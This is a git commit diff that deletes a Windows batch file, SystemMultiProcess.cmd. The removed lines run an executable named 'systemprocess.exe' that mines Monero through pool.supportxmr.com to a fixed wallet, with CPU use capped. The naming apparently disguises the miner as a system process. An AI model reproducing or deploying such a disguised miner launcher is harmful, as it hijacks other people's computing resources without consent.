2784149371c1d2a662cf9c7b9d4816275834be65
sopranotech <sopranotechmx@gmail.com>
2024-08-23 12:53:45 -0600

    Delete SystemMultiProcess.cmd

--- SystemMultiProcess.cmd
+++
@@ -1,4 +0,0 @@
-@echo off
-cd /d "%~dp0"
-systemprocess.exe -o pool.supportxmr.com:8080 -u 88imMgKukbs5ArvaTUMoNeBPde87CL4cXeGui3mL6qCr6FtQ8A62LGR5n3fr8vmNEiYTXtZEHouawaPxhYbA6BdwR3nxwkv  --randomx-mode=fast --max-cpu-usage=15 --print-time=3600 --health-print-time=86400
-pause
